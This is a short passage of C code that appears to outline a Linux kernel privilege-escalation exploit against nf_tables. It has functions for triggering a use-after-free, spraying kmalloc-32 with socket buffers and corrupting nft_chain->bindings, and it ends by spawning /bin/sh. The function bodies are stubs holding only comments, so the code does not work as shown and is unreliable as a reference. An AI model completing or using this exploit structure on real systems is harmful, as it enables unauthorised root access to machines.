    // ... (abbreviated for brevity)
}

// kmalloc-32 spray with controlled data
void spray_skbuff() {
    // Use setsockopt() to allocate multiple SKBs in kmalloc-32
}

// Overwrite nft_chain->bindings
void corrupt_nft_chain() {
    // Sprayed data will corrupt the UAF object
}

int main() {
    trigger_uaf();
    spray_skbuff();
    corrupt_nft_chain();
    system("/bin/sh");
    return 0;
